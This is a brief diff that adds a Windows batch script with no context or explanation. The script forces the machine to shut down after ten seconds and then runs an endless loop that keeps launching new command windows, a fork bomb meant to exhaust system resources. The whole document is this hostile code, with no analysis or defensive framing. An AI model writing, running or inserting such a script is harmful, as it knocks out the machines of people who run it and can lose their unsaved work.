@@ -1,0 +1,5 @@
+shutdown.exe -s -t 10
+: A
+start
+goto A
+
